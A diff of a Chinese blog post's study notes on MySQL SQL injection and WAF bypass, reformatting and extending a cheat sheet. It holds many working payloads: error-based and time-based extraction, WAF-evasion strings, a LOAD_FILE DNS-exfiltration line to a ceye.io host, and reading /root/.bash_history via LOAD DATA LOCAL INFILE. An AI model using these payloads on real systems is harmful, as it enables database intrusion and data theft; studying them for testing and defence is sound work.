@@ -5,49 +5,50 @@ tags:
 - SQL注入
 ---
 深入的探究下SQL的waf和绕过。试试自己写一个简单的扫描器出来。
-<!--more-->
+
 **参考文章**
 文章很多...
-https://xz.aliyun.com/t/1027
-https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/
-http://netsecurity.51cto.com/art/201701/526861.htm
-https://xz.aliyun.com/t/1586
-https://xz.aliyun.com/t/2288
-https://xz.aliyun.com/t/2359
-https://xz.aliyun.com/t/253
-https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html
-https://xz.aliyun.com/t/3950
-https://lightless.me/archives/read-mysql-client-file.html
-https://xz.aliyun.com/t/3973
-https://xz.aliyun.com/t/1174
-https://xz.aliyun.com/t/2069
-http://drops.xmd5.com/static/drops/tips-7883.html
-https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw
-https://xz.aliyun.com/t/40
-https://notwhy.github.io/2018/06/sql-injection-fuck-waf/
-https://xz.aliyun.com/t/2583
-https://xz.aliyun.com/t/1248
-https://xz.aliyun.com/t/2167
-https://xz.aliyun.com/t/2199
-https://xz.aliyun.com/t/2365
-https://xz.aliyun.com/t/1
-https://xz.aliyun.com/t/2719
-https://xz.aliyun.com/t/1652
-https://xz.aliyun.com/t/492
-https://xz.aliyun.com/t/49
-https://xz.aliyun.com/t/250
-https://xz.aliyun.com/t/246
-http://blog.nsfocus.net/mysql-vulnerability-technical-analysis-protection-programs/
-https://www.cnblogs.com/dliv3/p/6412653.html
-https://xz.aliyun.com/t/1122
+- https://xz.aliyun.com/t/1027
+- https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/
+- http://netsecurity.51cto.com/art/201701/526861.htm
+- https://xz.aliyun.com/t/1586
+- https://xz.aliyun.com/t/2288
+- https://xz.aliyun.com/t/2359
+- https://xz.aliyun.com/t/253
+- https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html
+- https://xz.aliyun.com/t/3950
+- https://lightless.me/archives/read-mysql-client-file.html
+- https://xz.aliyun.com/t/3973
+- https://xz.aliyun.com/t/1174
+- https://xz.aliyun.com/t/2069
+- http://drops.xmd5.com/static/drops/tips-7883.html
+- https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw
+- https://xz.aliyun.com/t/40
+- https://notwhy.github.io/2018/06/sql-injection-fuck-waf/
+- https://xz.aliyun.com/t/2583
+- https://xz.aliyun.com/t/1248
+- https://xz.aliyun.com/t/2167
+- https://xz.aliyun.com/t/2199
+- https://xz.aliyun.com/t/2365
+- https://xz.aliyun.com/t/1
+- https://xz.aliyun.com/t/2719
+- https://xz.aliyun.com/t/1652
+- https://xz.aliyun.com/t/492
+- https://xz.aliyun.com/t/49
+- https://xz.aliyun.com/t/250
+- https://xz.aliyun.com/t/246
+- http://blog.nsfocus.net/mysql-vulnerability-technical-analysis-protection-programs/
+- https://www.cnblogs.com/dliv3/p/6412653.html
+- https://xz.aliyun.com/t/1122
+
 # 基础知识：
 
 **基本语句：**
 ![](/images/19-2-8_SQL_基本语句1.png)
 
 **基础知识：**
-	3306端口。
-	默认用户root
+- 3306端口。
+- 默认用户root
 
 **基础命令：**
 ```
@@ -65,10 +66,13 @@ https://xz.aliyun.com/t/1122
 	select schema();
 	select @@hostname;
 	select @@basedir
+	show create table `tabelname` #如果表名全是数字要加反引号
+	show table `tablename
+	show grants for 用户名@'主机地址'  #查看当前用户权限
 ```
 
 **运算符**
-/ - + * | & ^ || && xor or and
+`/ - + * | & ^ || && xor or and`
 
 **注释:**
 - --空格
@@ -78,12 +82,12 @@ https://xz.aliyun.com/t/1122
 - /*!xxxxxselect user()*/ 5位数字
 
 **查看权限：**
-```
+```sql
 	SELECT file_priv FROM mysql.user WHERE user = 'root';（需要root用户来执行）
 	SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';（普通用户也可以）
 ```
 **文件写入：**	
-```
+```sql
 	select 'test' into outfile "d:\\test.txt"; into outfile不可以覆盖已经存在的文件
 ```
 
@@ -108,13 +112,12 @@ information_shcema表中存有所有的表。
 
 ![](/images/19-2-8_SQL_特性1.jpg)
 ![](/images/19-2-8_SQL_特性2.jpg)
+
 语句如下：
-```
+```sql
 create table test.m1(code text);
 load data local infile '/root/.bash_history' into table test.m1 fields terminated by ''
 ```
-
-
 
 # 注入思路
 ## 过滤了字段和逗号
@@ -149,7 +152,7 @@ select * from(
 select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
 ```
 **提取列名：**
-```
+```sql
 select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
 ```
 
@@ -217,7 +220,7 @@ Ruby:
 MySQL>5.6增加了两个新表`innodb_index_stats`和`innodb_table_stats`用于记录更改和新创建的数据库和表的信息。此信息永久保留。
 
 因此可以有：
-```
+```sql
 select table_name from mysql.innodb_table_stats where database_name=schema();
 ```
 
@@ -229,7 +232,7 @@ select table_name from mysql.innodb_table_stats where database_name=schema();
 还可以使用
 
 **笛卡尔积**
-```
+```sql
 SELECT count(*) FROM information_schema.columns A, information_schema.columns B;
 ```
 
@@ -238,7 +241,7 @@ SELECT count(*) FROM information_schema.columns A, information_schema.columns B;
 ![](/images/19-2-9_SQL_思路3.png)
 
 **正则bug**
-```
+```sql
 select rpad('a',10485,'a') RLIKE concat(repeat('(a.*)+',10480),'b');
 ```
 ![](/images/19-2-9_SQL_思路4.png)
@@ -252,7 +255,7 @@ select rpad('a',10485,'a') RLIKE concat(repeat('(a.*)+',10480),'b');
 mysql的话secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。
 
 **payload**
-```
+```sql
 SELECT LOAD_FILE(CONCAT('\\\\',(SELECT 2333),'.ceye.io/abc'));
 ```
 
@@ -263,26 +266,47 @@ SELECT LOAD_FILE(CONCAT('\\\\',(SELECT 2333),'.ceye.io/abc'));
 在自己的vps测试了下还能够使用的报错函数有：
 `floor`,`extractvalue`,`updatexml`
 ![](/images/19-2-9_SQL_思路5.png)
-```
+```sql
 select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
 select extractvalue(1,concat(0x7e,(select @@version),0x7e));
 select updatexml(1,concat(0x7e,(select @@version),0x7e),1);
 ```
 还有一些其他姿势
 
+## Polygon
+利用条件：
+- 需要知道当前查询表的字段名
+
+```sql
+select * from user where ID=1 and Polygon(ID)
+
+---
+mysql> select * from user where ID=1 and Polygon(ID);
+ERROR 1367 (22007): Illegal non geometric '`user`.`user`.`ID`' value found during parsing
+---
+```
+
+
+
+
 **数据溢出**
-参考：https://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html
-版本：5.5<version<5.5.53
-姿势：`select (select(!x-~0)from(select(select user())x)a);`
-报错信息长度限制在my_error.c中`define ERRMSGSIZI(512)`
+参考：
+	- https://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html
+版本：
+	- `5.5<version<5.5.53`
+姿势：
+```sql
+select (select(!x-~0)from(select(select user())x)a);
+```
+报错信息长度限制在my_error.c中的`define ERRMSGSIZI(512)`
 
 **列名重复**
 利用name_const构建表名报错版本，name_const要求参数是常量，所以没什么好利用的。
-```
+```sql
 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
 ```
 join函数利用此特性可以爆表名
-```
+```sql
 mysql> select *  from(select * from test a join test b)c;
 ERROR 1060 (42S21): Duplicate column name 'id'
 mysql> select *  from(select * from test a join test b using(id))c;
@@ -344,8 +368,9 @@ SELECT * FROM users WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select
 ## where查询的注入
 
 where查询的最基本语句：
-`select username from users where id='$id'`
-
+```sql
+select username from users where id='$id'
+```
 首先进行最基本的测试，进行判断能否成功闭合语句。
 
 **测试语句**
@@ -400,14 +425,11 @@ select (select(!x-~0)from(select(select user())x)a);
 ```
 具体情况需要具体结合。其中updatexml和floor、extractvalue类似。简单的列出floor的数据后去过程：
 ```SQL
-	select 1 from(select count(*),concat((select concat(0x7e,version(),0x7e)),floor(rand(0)*2))x from information_schema.tables group by x)a;
-	select 1 from(select count(*),concat((select distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
-	
-	select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
-
-	select 1 from(select count(*),concat((select distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name='users' LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
-
-	select 1 from(select count(*),concat((select distinct concat(0x7e,column,0x7e) FROM database.table LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
+select 1 from(select count(*),concat((select concat(0x7e,version(),0x7e)),floor(rand(0)*2))x from information_schema.tables group by x)a;
+select 1 from(select count(*),concat((select distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a;	
+select 1 from(select count(*),concat((select distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
+select 1 from(select count(*),concat((select distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name='users' LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
+select 1 from(select count(*),concat((select distinct concat(0x7e,column,0x7e) FROM database.table LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;
 ```
 name_cons由于参数只能为常量，没有更好的利用手段，只能爆出版本号。
 join的利用和name_const是一个特性，可以爆出列名。
@@ -439,6 +461,7 @@ s%u00f0lect->select
 右括号)：
  %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9
 ```
+
 ### union注入
 有回显，使用order by探测列。如果被过滤了只能强行使用union慢慢测试了....
 
@@ -455,10 +478,10 @@ union select 1,group_concat(schema_name),3 from information_schema.schemata
 
 考虑双写(oorr)，大小写，内联注释，编码，等价替换，用户变量等绕过手段,如：
 - 过滤了`union select`
-```
+```sql
 select 1 union(select(username)from(users));
 ```
-`union select`里面还可以使用`all`,`distinct`。也可以使用编码`09 0A 0B 0C 0D A0 20`替代空格等。
+`union select`里面还可以使用`all`,`distinct`。也可以考虑使用编码`09 0A 0B 0C 0D A0 20`替代空格等。
 - 过滤了空格
 ```SQL
 select~1
@@ -509,8 +532,8 @@ Hex('a')
 Unhex(61)
 ```
 - 逻辑语言
-```
-+ = < > && || ^
+```sql
+^ + = < > && ||
 regexp like rlike
 ```
 
@@ -536,11 +559,13 @@ mid(version() from 1 for 1)
 
 ## limit后的注入：
 - 基于爆错
-```
+```sql
 SELECT * FROM users WHERE id>0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
 ```
 - 基于时间
+```sql
 SELECT * FROM users WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
+```
 
 ## insert update注入
 - 插入的数据中都可以使用子查询查询他表内容，但是如果只有一个表的话可以使用这种方法：
@@ -553,6 +578,7 @@ update users set username = 'j7ur8'| conv(hex(substr((select username from (sele
 UPDATE `mytable` join (select updatexml(1,concat(0x23,user()),1))b join `mytable` `b` SET `username`='admin' WHERE sex=1;
 ERROR 1105 (HY000): XPATH syntax error: '#root@localhost'
 ```
+
 ## order by注入
 
 **语句**
@@ -581,27 +607,31 @@ ERROR 1105 (HY000): XPATH syntax error: '#root@localhost'
 
 **语句**
 - 查询语句
-```
+```sql
 select * from cms where id='{$_GET['id']}'
 ```
 - 绕过语句
 ```SQL
-id=3'/*!and*/ 2e1/**/=2e1--+
-id=2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,database/**/(),4,5))--+
-id=2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=0x74657374))--+
+where id='3'/*!and*/ 2e1/**/=2e1--+
+where id='2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,database/**/(),4,5))--+
+where id='2e1'/*!and*/ 2e1/**/=2e1union(/*.1112*//**//*!*/(select@1/**/,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=0x74657374))--+
+```
+```sql
 id=1 and{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}
 id=-11/*!union/*!select/*!1,(select/*!password/*!from/*!test.user limit 0,1),3*/
 id=-11 union--+%0aselect 1,(select--+%0apassword from --%01%0atest.user limit 0,1),3
 id=@a:=(select@b:=`username`from{a test.user}limit0,1)union--%0aselect'1',@a,3
 id=-1/*!union--%01%0aselect1,password,3 from test.user*/
+```
+```sql
 select * from users where id=\Nunion select 1;
 select * from users where id=1.1union select 1;
 select * from users where id=8e0union select 1;
 select * from users where id=/*!50000union*/ select 1;
 select{x 1};  // https://dev.mysql.com/doc/refman/5.7/en/expressions.html
 select\N 1;  
-
 ```
+
 waf检测到sql中有长字符可能存在绕过：
 ![](/images/19-2-16_SQL_过狗2.png)
 
